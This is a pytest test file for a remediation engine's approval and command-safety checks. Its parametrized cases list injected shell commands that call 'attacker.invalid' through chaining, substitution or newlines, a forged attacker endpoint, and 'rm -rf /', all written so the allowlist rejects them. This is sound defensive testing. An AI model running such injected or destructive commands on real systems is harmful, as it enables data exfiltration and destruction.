from datetime import UTC, datetime
from importlib import util
from pathlib import Path

import pytest
from common.database import IncidentRecord
from common.models import Approval as ApprovalModel
from common.models import ApprovalDecision, RemediationAction, RemediationStatus
from common.orchestration.execution_plan import normalize_approved_remediation_command
from common.orchestration.execution_plan_contract import canonical_plan_fingerprint
from common.repository import IncidentRepository
from remediation_test_helpers import governed_approval as Approval


def load_remediation_app_module():
    module_path = Path("backend/src/remediation-engine/app.py")
    spec = util.spec_from_file_location("remediation_engine_app_idempotency", module_path)
    if spec is None or spec.loader is None:
        raise RuntimeError("Unable to load remediation-engine app module")
    module = util.module_from_spec(spec)
    spec.loader.exec_module(module)
    return module


def test_build_action_idempotency_key_is_deterministic_per_action_type() -> None:
    module = load_remediation_app_module()
    approval = Approval(
        tenant_id="tenant-a",
        incident_id="11111111-1111-1111-1111-111111111111",
        recommendation_id="22222222-2222-2222-2222-222222222222",
        plan_id="33333333-3333-3333-3333-333333333333",
        plan_fingerprint="sha256:" + "a" * 64,
        approval_expires_at=datetime(2099, 1, 1, tzinfo=UTC),
        decision=ApprovalDecision.APPROVED,
    )

    key_one = module._build_action_idempotency_key(approval, "rollback_deployment")
    key_two = module._build_action_idempotency_key(approval, "rollback_deployment")
    key_other_action = module._build_action_idempotency_key(approval, "restart_pod")

    assert key_one == key_two
    assert key_one != key_other_action


def test_temporal_duplicate_workflow_exception_is_available() -> None:
    """Keep the durable execution endpoint aligned with the installed SDK."""
    from temporalio.exceptions import WorkflowAlreadyStartedError

    assert issubclass(WorkflowAlreadyStartedError, Exception)


def test_temporal_retry_uses_a_new_workflow_for_a_new_approval() -> None:
    module = load_remediation_app_module()
    first = Approval(
        incident_id="11111111-1111-1111-1111-111111111111",
        recommendation_id="22222222-2222-2222-2222-222222222222",
        decision=ApprovalDecision.APPROVED,
    )
    retry = first.model_copy(update={"id": "33333333-3333-4333-8333-333333333333"})
    key = module._build_action_idempotency_key(first, "restart_service")

    assert module._remediation_workflow_id(first, key) == module._remediation_workflow_id(first, key)
    assert module._remediation_workflow_id(first, key) != module._remediation_workflow_id(retry, key)


@pytest.mark.asyncio
async def test_target_execution_is_exclusive_until_terminal(sqlite_session_factory) -> None:
    module = load_remediation_app_module()
    module.settings.database_enabled = True
    module.app.state.session_factory = sqlite_session_factory
    first = RemediationAction(
        tenant_id="tenant-a",
        incident_id="11111111-1111-4111-8111-111111111111",
        approval_id="21111111-1111-4111-8111-111111111111",
        action_type="restart_service",
        target="payments-api",
        status=RemediationStatus.DISPATCHING,
        parameters={"environment": "prod"},
    )
    second = RemediationAction(
        tenant_id="tenant-a",
        incident_id="33333333-3333-4333-8333-333333333333",
        approval_id="43333333-3333-4333-8333-333333333333",
        action_type="restart_service",
        target="payments-api",
        status=RemediationStatus.DISPATCHING,
        parameters={"environment": "prod"},
    )

    await module._reserve_target_execution(module.app, first)
    with pytest.raises(Exception) as exc_info:
        await module._reserve_target_execution(module.app, second)
    assert getattr(exc_info.value, "status_code", None) == 409
    assert getattr(exc_info.value, "detail", {}).get("code") == "target_execution_busy"

    first.status = RemediationStatus.SUCCEEDED
    await module._persist_action(module.app, first)
    await module._reserve_target_execution(module.app, second)


@pytest.mark.asyncio
async def test_target_execution_scope_allows_distinct_targets(sqlite_session_factory) -> None:
    module = load_remediation_app_module()
    module.settings.database_enabled = True
    module.app.state.session_factory = sqlite_session_factory
    prod = RemediationAction(
        tenant_id="tenant-a",
        incident_id="51111111-1111-4111-8111-111111111111",
        approval_id="61111111-1111-4111-8111-111111111111",
        action_type="restart_service",
        target="payments-api",
        status=RemediationStatus.DISPATCHING,
        parameters={"environment": "prod"},
    )
    inventory = RemediationAction(
        tenant_id="tenant-a",
        incident_id="73333333-3333-4333-8333-333333333333",
        approval_id="83333333-3333-4333-8333-333333333333",
        action_type="restart_service",
        target="inventory-api",
        status=RemediationStatus.DISPATCHING,
        parameters={"environment": "prod"},
    )

    await module._reserve_target_execution(module.app, prod)
    await module._reserve_target_execution(module.app, inventory)


@pytest.mark.asyncio
async def test_redelivered_approval_message_does_not_re_execute_remediation(sqlite_session_factory, monkeypatch) -> None:
    """A RabbitMQ redelivery (e.g. consumer crash between plugin execution and
    ack) resends the same approval payload. Without the idempotency check this
    would run a real remediation plugin (K8s restart, Jenkins rollback, ...)
    twice for one approved action.
    """
    module = load_remediation_app_module()
    module.settings.database_enabled = True
    module.app.state.session_factory = sqlite_session_factory

    class ProducerStub:
        async def publish(self, *_args, **_kwargs):
            return None

    module.app.state.producer = ProducerStub()

    async def approved_runbook(_approval):
        return None

    monkeypatch.setattr(module, "_require_persisted_approved_runbook", approved_runbook)

    plan = {
        "schema_version": "kaims.execution-plan.v2",
        "tenant_id": "tenant-a",
        "incident_id": "11111111-1111-1111-1111-111111111111",
        "plan_id": "33333333-3333-3333-3333-333333333333",
        "expiry": "2099-01-01T00:00:00+00:00",
        "execution_ready": True,
        "actions": [{
            "action_id": "rollback_deployment",
            "inputs": {"operation": "rollback_deployment"},
        }],
        "commands": ["kubectl rollout restart deployment/payments -n prod"],
        "validation_commands": ["kubectl rollout status deployment/payments -n prod --timeout=120s"],
        "rollback_commands": ["kubectl rollout undo deployment/payments -n prod"],
        "readiness_blocks": [],
    }
    approval = Approval(
        tenant_id="tenant-a",
        incident_id="11111111-1111-1111-1111-111111111111",
        recommendation_id="22222222-2222-2222-2222-222222222222",
        plan_id="33333333-3333-3333-3333-333333333333",
        approval_expires_at=datetime(2099, 1, 1, tzinfo=UTC),
        decision=ApprovalDecision.APPROVED,
        approver="sre@example.com",
        comment="Rollback deployment",
        metadata={
            "service": "api-gateway",
            "execution_plan": plan,
            "connection_profile": {
                "executor_type": "jenkins",
                "endpoint_url": "https://jenkins.example",
                "job_name": "governed-remediation",
                "credential_ref": "vault://jenkins/api-token",
            },
        },
    )

    execute_calls = 0
    async def counting_execute(action):
        nonlocal execute_calls
        execute_calls += 1
        action.status = RemediationStatus.SUCCEEDED
        action.output = "mocked terminal executor success"
        action.parameters["execution_result"] = {
            "executed": True,
            "executor": "jenkins",
            "build_result": "SUCCESS",
        }
        return action

    module.engine.execute = counting_execute

    async with sqlite_session_factory() as session:
        await IncidentRepository(session).save_approval(approval)
        await session.commit()

    first = await module.execute_approval(approval)
    second = await module.execute_approval(approval)

    assert execute_calls == 1
    assert first.idempotency_key is not None
    assert first.idempotency_key == second.idempotency_key
    assert second.id == first.id


@pytest.mark.asyncio
async def test_execution_hydration_uses_persisted_approval_profile(sqlite_session_factory) -> None:
    module = load_remediation_app_module()
    module.settings.database_enabled = True
    module.app.state.session_factory = sqlite_session_factory
    incident_id = "61111111-1111-4111-8111-111111111111"
    approved_profile = {
        "executor_type": "jenkins",
        "endpoint_url": "https://approved-executor.example.test",
        "job_name": "approved-remediation",
        "credential_ref": "vault://test/approved-token",
        "environment": "test",
        "service": "payments-api",
    }
    original = Approval(
        tenant_id="tenant-a",
        incident_id=incident_id,
        recommendation_id="62222222-2222-4222-8222-222222222222",
        decision=ApprovalDecision.APPROVED,
        approver="reviewed-operator@example.test",
        modified_action="Restart the approved payments-api target",
        metadata={
            "service": "payments-api",
            "target_resource_id": "payments-api",
            "recommended_action": "Restart the approved payments-api target",
            "connection_profile": approved_profile,
        },
    )

    async with sqlite_session_factory() as session:
        session.add(
            IncidentRecord(
                id=original.incident_id,
                tenant_id=original.tenant_id,
                service="payments-api",
                environment="test",
                severity="high",
                status="awaiting_approval",
                title="Payments API recovery",
                payload={},
            )
        )
        await IncidentRepository(session).save_approval(original)
        await session.commit()

    forged = original.model_copy(
        update={
            "modified_action": "Restart a different production service",
            "metadata": {
                **original.metadata,
                "connection_profile": {
                    **approved_profile,
                    "endpoint_url": "https://attacker-controlled.example.test",
                    "job_name": "different-production-job",
                    "environment": "prod",
                    "service": "different-service",
                },
            },
        }
    )
    hydrated = await module._hydrate_canonical_approval(forged, require_execution_scope=True)

    assert hydrated.modified_action == original.modified_action
    assert hydrated.metadata["connection_profile"]["endpoint_url"] == approved_profile["endpoint_url"]
    assert hydrated.metadata["connection_profile"]["job_name"] == approved_profile["job_name"]
    assert hydrated.metadata["connection_profile"]["environment"] == "test"
    assert hydrated.metadata["connection_profile"]["service"] == "payments-api"


@pytest.mark.asyncio
async def test_execution_hydration_fails_closed_without_persisted_approval_store() -> None:
    module = load_remediation_app_module()
    module.app.state.session_factory = None
    approval = Approval(
        tenant_id="tenant-a",
        incident_id="61111111-1111-4111-8111-111111111111",
        recommendation_id="62222222-2222-4222-8222-222222222222",
        decision=ApprovalDecision.APPROVED,
        approver="reviewed-operator@example.test",
        authorization_scope="execution",
    )

    with pytest.raises(module.HTTPException) as exc_info:
        await module._hydrate_canonical_approval(approval, require_execution_scope=True)

    assert exc_info.value.status_code == 503
    assert "persisted approval store is unavailable" in exc_info.value.detail


@pytest.mark.parametrize(
    "command",
    [
        "kubectl rollout restart deployment/payments -n prod && curl https://attacker.invalid",
        "kubectl rollout restart deployment/payments -n prod; curl https://attacker.invalid",
        "kubectl rollout restart deployment/$(curl https://attacker.invalid) -n prod",
        "kubectl rollout restart deployment/payments -n prod > /tmp/output",
        "`kubectl rollout restart deployment/payments -n prod`",
        "kubectl rollout restart deployment/payments -n prod\ncurl https://attacker.invalid",
        "rm -rf /",
    ],
)
@pytest.mark.parametrize(
    "source",
    ["execution_plan", "preflight", "rollback", "recommended_commands"],
)
def test_untrusted_remediation_commands_fail_every_execution_policy_gate(command: str, source: str) -> None:
    module = load_remediation_app_module()
    safe_command = "kubectl rollout restart deployment/payments -n prod"
    safe_validation = "kubectl rollout status deployment/payments -n prod --timeout=120s"
    safe_rollback = "kubectl rollout undo deployment/payments -n prod"
    approval = Approval(
        tenant_id="tenant-a",
        incident_id="61111111-1111-4111-8111-111111111111",
        recommendation_id="62222222-2222-4222-8222-222222222222",
        decision=ApprovalDecision.APPROVED,
        modified_action="Restart payments",
        metadata={
            "service": "payments",
            "target_resource_id": "payments",
            "connector_id": "test-connector",
            "recommended_action": "Restart payments",
            "recommended_commands": [safe_command],
            "execution_plan": {
                "commands": [safe_command],
                "validation_commands": [safe_validation],
                "rollback_commands": [safe_rollback],
                "rollback": [safe_rollback],
                "target_resource_id": "payments",
                "remediation_target": "payments",
                "connector_id": "test-connector",
            },
        },
    )
    metadata = dict(approval.metadata)
    plan = dict(metadata["execution_plan"])
    if source == "execution_plan":
        plan["commands"] = [command]
        plan["actions"] = [
            {**action, "inputs": {**action.get("inputs", {}), "catalog_command": command}}
            for action in plan["actions"]
        ]
    elif source == "recommended_commands":
        metadata["recommended_commands"] = [command]
    else:
        plan[source] = [command]
    plan["plan_fingerprint"] = canonical_plan_fingerprint(plan)
    metadata["execution_plan"] = plan
    forged = approval.model_copy(
        update={
            "plan_fingerprint": plan["plan_fingerprint"],
            "metadata": metadata,
        }
    )

    assert module.verify_plan_fingerprint(plan)
    assert module._unsafe_plan_reasons(forged)
    with pytest.raises(ValueError, match="automated allowlist"):
        module.engine.build_action(forged)


@pytest.mark.parametrize(
    ("prefix", "expected"),
    [
        ("1. ", "kubectl rollout restart deployment/payments -n prod"),
        ("2) ", "kubectl rollout restart deployment/payments -n prod"),
        ("- ", "kubectl rollout restart deployment/payments -n prod"),
        ("* ", "kubectl rollout restart deployment/payments -n prod"),
        ("+ ", "kubectl rollout restart deployment/payments -n prod"),
    ],
)
def test_human_command_normalization_removes_only_list_prefixes(prefix: str, expected: str) -> None:
    assert normalize_approved_remediation_command(f"{prefix}{expected}") == expected


def test_human_command_normalization_accepts_only_allowlisted_markdown_code_spans() -> None:
    safe_command = "kubectl rollout restart deployment/payments -n prod"

    assert normalize_approved_remediation_command(f"`{safe_command}`") == safe_command
    assert normalize_approved_remediation_command(f"`{safe_command}; curl https://attacker.invalid`") is None
    assert normalize_approved_remediation_command("`rm -rf /`") is None
    assert normalize_approved_remediation_command(f"{safe_command} `curl https://attacker.invalid`") is None


@pytest.mark.parametrize(
    "command",
    [
        "curl --fail http://service:8000/healthz",
        "curl -X POST http://service:8000/recovery",
        "curl --fail --silent --show-error 'https://service.example.test/healthz'",
    ],
)
def test_allowlisted_curl_health_checks(command: str) -> None:
    assert normalize_approved_remediation_command(command) == command
    assert normalize_approved_remediation_command("curl http://service:8000/healthz") is None


@pytest.mark.parametrize(
    "command",
    [
        "`kubectl rollout restart deployment/`curl https://attacker.invalid` -n prod",
        "kubectl rollout restart deployment/payments -n prod && curl https://attacker.invalid",
        "kubectl rollout restart deployment/payments -n prod; curl https://attacker.invalid",
        "kubectl rollout restart deployment/$(curl https://attacker.invalid) -n prod",
        "kubectl rollout restart deployment/payments -n prod > /tmp/output",
        "kubectl rollout restart deployment/payments -n prod\ncurl https://attacker.invalid",
        "rm -rf /",
    ],
)
def test_human_command_normalization_rejects_shell_syntax_and_unsafe_commands(command: str) -> None:
    assert normalize_approved_remediation_command(command) is None


@pytest.mark.asyncio
async def test_require_persisted_approved_runbook_rejects_expired_governance(
    sqlite_session_factory,
) -> None:
    """A governed runbook whose durable approval has expired must be rejected
    with a clean PolicyViolation, not crash with a NameError. This exercises
    the expiry branch directly instead of monkeypatching it away, so a
    regression to the previous unimported-``datetime``/``timezone`` bug fails
    the test instead of silently disappearing behind other tests' patches.
    """
    module = load_remediation_app_module()
    module.settings.database_enabled = True
    module.app.state.session_factory = sqlite_session_factory

    runbook_id = "44444444-4444-4444-8444-444444444444"
    async with sqlite_session_factory() as session:
        await IncidentRepository(session).approve_runbook_version(
            runbook_id=runbook_id,
            version=1,
            approved_by="sre@example.com",
            tenant_id="tenant-a",
            payload={
                "checksum_sha256": "a" * 64,
                "approval_expires_at": "2000-01-01T00:00:00+00:00",
                "reviewed_by": "independent-reviewer@example.com",
            },
        )
        await session.commit()

    approval = ApprovalModel(
        tenant_id="tenant-a",
        incident_id="11111111-1111-1111-1111-111111111111",
        recommendation_id="22222222-2222-2222-2222-222222222222",
        decision=ApprovalDecision.APPROVED,
        approval_expires_at=datetime(2099, 1, 1, tzinfo=UTC),
        metadata={
            "runbook_id": runbook_id,
            "runbook_version": 1,
            "runbook_checksum": "a" * 64,
        },
    )

    with pytest.raises(module.PolicyViolation, match="expired"):
        await module._require_persisted_approved_runbook(approval)


@pytest.mark.asyncio
async def test_require_persisted_approved_runbook_accepts_unexpired_governance(
    sqlite_session_factory,
) -> None:
    module = load_remediation_app_module()
    module.settings.database_enabled = True
    module.app.state.session_factory = sqlite_session_factory

    runbook_id = "55555555-5555-4555-8555-555555555555"
    async with sqlite_session_factory() as session:
        await IncidentRepository(session).approve_runbook_version(
            runbook_id=runbook_id,
            version=1,
            approved_by="sre@example.com",
            tenant_id="tenant-a",
            payload={
                "checksum_sha256": "b" * 64,
                "approval_expires_at": "2099-01-01T00:00:00+00:00",
                "reviewed_by": "independent-reviewer@example.com",
            },
        )
        await session.commit()

    approval = ApprovalModel(
        tenant_id="tenant-a",
        incident_id="11111111-1111-1111-1111-111111111111",
        recommendation_id="22222222-2222-2222-2222-222222222222",
        decision=ApprovalDecision.APPROVED,
        approval_expires_at=datetime(2099, 1, 1, tzinfo=UTC),
        metadata={
            "runbook_id": runbook_id,
            "runbook_version": 1,
            "runbook_checksum": "b" * 64,
        },
    )

    await module._require_persisted_approved_runbook(approval)


@pytest.mark.asyncio
async def test_dry_run_authorization_cannot_execute_live_remediation() -> None:
    module = load_remediation_app_module()
    approval = Approval(
        tenant_id="tenant-a",
        incident_id="11111111-1111-1111-1111-111111111111",
        recommendation_id="22222222-2222-2222-2222-222222222222",
        decision=ApprovalDecision.APPROVED,
        approver="reviewer@example.com",
        authorization_scope="dry_run",
    )

    with pytest.raises(module.HTTPException) as exc:
        await module._execute_approval(approval)
    assert exc.value.status_code == 403


@pytest.mark.asyncio
async def test_execute_rejects_unpersisted_human_approval(sqlite_session_factory) -> None:
    module = load_remediation_app_module()
    module.settings.database_enabled = True
    module.app.state.session_factory = sqlite_session_factory
    approval = Approval(
        incident_id="aaaaaaaa-aaaa-4aaa-8aaa-aaaaaaaaaaaa",
        recommendation_id="bbbbbbbb-bbbb-4bbb-8bbb-bbbbbbbbbbbb",
        decision=ApprovalDecision.APPROVED,
        approver="operator@example.com",
        comment="unpersisted request body",
        metadata={
            "service": "api-gateway",
            "execution_plan": {
                "commands": ["kubectl rollout restart deployment/api-gateway -n prod"],
                "validation_commands": ["kubectl rollout status deployment/api-gateway -n prod"],
                "rollback_commands": ["kubectl rollout undo deployment/api-gateway -n prod"],
            },
        },
    )

    with pytest.raises(Exception) as exc_info:
        await module.execute_approval(approval)

    assert getattr(exc_info.value, "status_code", None) == 409
    assert "exact approval ID" in str(getattr(exc_info.value, "detail", ""))


@pytest.mark.asyncio
async def test_forged_auto_approved_flag_cannot_bypass_durable_receipt(sqlite_session_factory) -> None:
    module = load_remediation_app_module()
    module.settings.database_enabled = True
    module.app.state.session_factory = sqlite_session_factory
    approval = Approval(
        tenant_id="tenant-a",
        incident_id="aaaaaaaa-aaaa-4aaa-8aaa-aaaaaaaaaaaa",
        recommendation_id="bbbbbbbb-bbbb-4bbb-8bbb-bbbbbbbbbbbb",
        decision=ApprovalDecision.APPROVED,
        approver="attacker@example.com",
        metadata={"auto_approved": True},
    )

    with pytest.raises(module.HTTPException) as exc_info:
        await module._require_persisted_human_approval(approval)

    assert exc_info.value.status_code == 409


@pytest.mark.asyncio
async def test_execute_rejects_different_id_for_same_approved_recommendation(sqlite_session_factory) -> None:
    module = load_remediation_app_module()
    module.settings.database_enabled = True
    module.app.state.session_factory = sqlite_session_factory
    persisted = Approval(
        incident_id="aaaaaaaa-aaaa-4aaa-8aaa-aaaaaaaaaaaa",
        recommendation_id="bbbbbbbb-bbbb-4bbb-8bbb-bbbbbbbbbbbb",
        decision=ApprovalDecision.APPROVED,
        approver="operator@example.com",
    )
    forged = persisted.model_copy(update={"id": "cccccccc-cccc-4ccc-8ccc-cccccccccccc"})
    async with sqlite_session_factory() as session:
        await IncidentRepository(session).save_approval(persisted)
        await session.commit()

    with pytest.raises(Exception) as exc_info:
        await module.execute_approval(forged)

    assert getattr(exc_info.value, "status_code", None) == 409


@pytest.mark.asyncio
@pytest.mark.parametrize(
    "expiry",
    ["2000-01-01T00:00:00+00:00", "not-a-timestamp", "2099-01-01T00:00:00"],
)
async def test_build_action_rejects_expired_or_invalid_plan_expiry(expiry: str) -> None:
    module = load_remediation_app_module()
    approval = Approval(
        incident_id="aaaaaaaa-aaaa-4aaa-8aaa-aaaaaaaaaaaa",
        recommendation_id="bbbbbbbb-bbbb-4bbb-8bbb-bbbbbbbbbbbb",
        decision=ApprovalDecision.APPROVED,
        approval_expires_at=datetime(2099, 1, 1, tzinfo=UTC),
        metadata={"recommended_action": "Restart payments"},
    )
    plan = dict(approval.metadata["execution_plan"])
    plan["expiry"] = expiry
    plan["plan_fingerprint"] = canonical_plan_fingerprint(plan)
    approval.metadata["execution_plan"] = plan
    approval.plan_fingerprint = plan["plan_fingerprint"]

    with pytest.raises(ValueError, match="expired|expiry|timezone-aware"):
        module.engine.build_action(approval)


@pytest.mark.asyncio
async def test_execute_rejects_expired_canonical_plan_without_invoking_executor(
    sqlite_session_factory,
    monkeypatch: pytest.MonkeyPatch,
) -> None:
    module = load_remediation_app_module()
    module.settings.database_enabled = True
    module.app.state.session_factory = sqlite_session_factory
    execute_calls = 0

    async def counting_execute(action):
        nonlocal execute_calls
        execute_calls += 1
        return action

    monkeypatch.setattr(module.engine, "execute", counting_execute)
    approval = Approval(
        incident_id="aaaaaaaa-aaaa-4aaa-8aaa-aaaaaaaaaaaa",
        recommendation_id="bbbbbbbb-bbbb-4bbb-8bbb-bbbbbbbbbbbb",
        decision=ApprovalDecision.APPROVED,
        approver="operator@example.com",
        approval_expires_at=datetime(2099, 1, 1, tzinfo=UTC),
        metadata={"recommended_action": "Restart payments"},
    )
    plan = dict(approval.metadata["execution_plan"])
    plan["expiry"] = "2000-01-01T00:00:00+00:00"
    plan["plan_fingerprint"] = canonical_plan_fingerprint(plan)
    approval.metadata["execution_plan"] = plan
    approval.plan_fingerprint = plan["plan_fingerprint"]
    approval.metadata["execution_plan"] = plan

    async with sqlite_session_factory() as session:
        session.add(
            IncidentRecord(
                id=approval.incident_id,
                tenant_id=approval.tenant_id,
                service="payments",
                environment="test",
                severity="high",
                status="awaiting_approval",
                title="Payments recovery",
                payload={},
            )
        )
        await IncidentRepository(session).save_approval(approval)
        await session.commit()

    with pytest.raises(module.HTTPException, match="execution plan has expired"):
        await module.execute_approval(approval)

    assert execute_calls == 0


@pytest.mark.asyncio
async def test_execute_rejects_expired_persisted_approval_without_invoking_executor(
    sqlite_session_factory,
    monkeypatch: pytest.MonkeyPatch,
) -> None:
    module = load_remediation_app_module()
    module.settings.database_enabled = True
    module.app.state.session_factory = sqlite_session_factory
    execute_calls = 0

    async def counting_execute(action):
        nonlocal execute_calls
        execute_calls += 1
        return action

    monkeypatch.setattr(module.engine, "execute", counting_execute)
    expired = Approval(
        incident_id="aaaaaaaa-aaaa-4aaa-8aaa-aaaaaaaaaaaa",
        recommendation_id="bbbbbbbb-bbbb-4bbb-8bbb-bbbbbbbbbbbb",
        decision=ApprovalDecision.APPROVED,
        approver="operator@example.com",
        approval_expires_at=datetime(2000, 1, 1, tzinfo=UTC),
        metadata={"recommended_action": "Restart payments"},
    )
    async with sqlite_session_factory() as session:
        await IncidentRepository(session).save_approval(expired)
        await session.commit()

    with pytest.raises(module.HTTPException, match="persisted approval has expired"):
        await module.execute_approval(expired)

    assert execute_calls == 0


@pytest.mark.asyncio
async def test_rejected_approval_never_invokes_executor(monkeypatch: pytest.MonkeyPatch) -> None:
    module = load_remediation_app_module()
    module.settings.database_enabled = False
    execute_calls = 0

    async def counting_execute(action):
        nonlocal execute_calls
        execute_calls += 1
        return action

    monkeypatch.setattr(module.engine, "execute", counting_execute)
    rejected = Approval(
        incident_id="aaaaaaaa-aaaa-4aaa-8aaa-aaaaaaaaaaaa",
        recommendation_id="bbbbbbbb-bbbb-4bbb-8bbb-bbbbbbbbbbbb",
        decision=ApprovalDecision.REJECTED,
        approver="operator@example.com",
    )

    action = await module._execute_approval(rejected)

    assert action.status == RemediationStatus.SKIPPED
    assert execute_calls == 0


def test_execution_readiness_fails_closed_without_governance_bindings() -> None:
    module = load_remediation_app_module()
    plan = {
        "schema_version": "kaims.execution-plan.v2",
        "tenant_id": "tenant-a",
        "incident_id": "11111111-1111-1111-1111-111111111111",
        "plan_id": "33333333-3333-3333-3333-333333333333",
        "execution_ready": True,
        "commands": ["kubectl rollout restart deployment/payments -n prod"],
        "validation_commands": ["kubectl rollout status deployment/payments -n prod --timeout=120s"],
        "rollback_commands": ["kubectl rollout undo deployment/payments -n prod"],
        "remediation_target": "payments-api",
        "connector_id": "kubernetes-prod",
    }
    plan["plan_fingerprint"] = canonical_plan_fingerprint(plan)
    approval = ApprovalModel(
        tenant_id="tenant-a",
        incident_id=plan["incident_id"],
        recommendation_id="22222222-2222-2222-2222-222222222222",
        decision=ApprovalDecision.APPROVED,
        metadata={"execution_plan": plan},
    )

    reasons = module._unsafe_plan_reasons(approval)

    assert any("rca version binding" in reason for reason in reasons)
    assert any("evidence snapshot id binding" in reason for reason in reasons)
    assert any("approved target resource binding" in reason for reason in reasons)


def test_execution_rejects_target_or_connector_different_from_approved_receipt() -> None:
    module = load_remediation_app_module()
    approval = Approval(
        tenant_id="tenant-a",
        incident_id="11111111-1111-1111-1111-111111111111",
        recommendation_id="22222222-2222-2222-2222-222222222222",
        decision=ApprovalDecision.APPROVED,
        metadata={
            "recommended_commands": ["kubectl rollout restart deployment/payments -n prod"],
            "execution_plan": {
                "commands": ["kubectl rollout restart deployment/payments -n prod"],
                "validation_commands": ["kubectl rollout status deployment/payments -n prod --timeout=120s"],
                "rollback_commands": ["kubectl rollout undo deployment/payments -n prod"],
                "remediation_target": "payments-api",
                "execution_ready": True,
            },
        },
    )
    approval.metadata["target_resource_id"] = "inventory-api"
    approval.metadata["connector_id"] = "different-connector"

    reasons = module._unsafe_plan_reasons(approval)

    assert any("approved target resource binding" in reason for reason in reasons)
    assert any("approved connector binding" in reason for reason in reasons)


@pytest.mark.asyncio
async def test_rollback_requires_governed_original_execution(monkeypatch: pytest.MonkeyPatch) -> None:
    module = load_remediation_app_module()
    module.settings.remediation_internal_token = "internal-remediation-token"
    approval = Approval(
        tenant_id="tenant-a",
        incident_id="11111111-1111-1111-1111-111111111111",
        recommendation_id="22222222-2222-2222-2222-222222222222",
        decision=ApprovalDecision.APPROVED,
        metadata={
            "recommended_commands": ["kubectl rollout restart deployment/payments -n prod"],
            "execution_plan": {
                "commands": ["kubectl rollout restart deployment/payments -n prod"],
                "validation_commands": ["kubectl rollout status deployment/payments -n prod --timeout=120s"],
                "rollback_commands": ["kubectl rollout undo deployment/payments -n prod"],
                "rollback_mode": "automatic",
                "remediation_target": "payments-api",
                "execution_ready": True,
            },
        },
    )

    async def persisted(_approval):
        return None

    async def missing_original(_app, _key):
        return None

    monkeypatch.setattr(module, "_require_persisted_human_approval", persisted)
    monkeypatch.setattr(module, "_find_existing_action", missing_original)

    with pytest.raises(module.HTTPException, match="no governed original execution") as exc_info:
        await module.rollback_execution_direct(
            {"approval": approval.model_dump(mode="json")},
            x_kaiops_internal_token="internal-remediation-token",
        )

    assert exc_info.value.status_code == 409
